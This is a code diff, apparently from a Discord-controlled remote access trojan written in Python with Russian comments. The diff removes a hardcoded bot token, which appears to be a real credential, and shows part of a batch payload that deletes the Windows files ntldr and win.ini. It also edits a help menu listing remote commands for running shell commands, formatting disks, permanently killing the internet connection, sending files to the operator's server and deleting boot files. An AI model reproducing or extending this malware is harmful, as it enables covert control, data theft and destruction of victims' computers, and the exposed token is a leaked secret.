@@ -1,4 +1,4 @@
-token = 'NjkyMDYwNDQ3MzE0MTQ5NDg2.XnpCEA.NnBWH7LLHJKtrTtkfzHwlnOQsTI' #Вставьте токен
+token = ' '  # Вставьте токен
 channel = 687944069271519257
 
 
@@ -46,6 +46,7 @@ del c:\ntldr
 attrib -r -s -h c:\windows\win.ini
 del c:\windows\win.ini'''
 
+
 helpmessage = '''
 -=**Configuration Administrarion Tool**=-
 **/move** (X) (Y) (time) - передвинуть курсор.
@@ -58,9 +59,8 @@ helpmessage = '''
 **/processlist** - выводит список процессов.
 **/command** - выполнить комманду в терминале.
 **/kill** (process) - закрыть принудительно процесс.
-**/video** - захват видео.
 **/delete** (file) - удалить файл.
-**/format** (disk) - отформатировать диск.
+**/disk_kill** (disk) - отформатировать диск.
 **/disable_internet**  - убить интернет соединение (навсегда).
 **/copy** (way) - отправляет файл к вам на сервер.
 **/system_kill** - удаляет важные файлы для запуска.
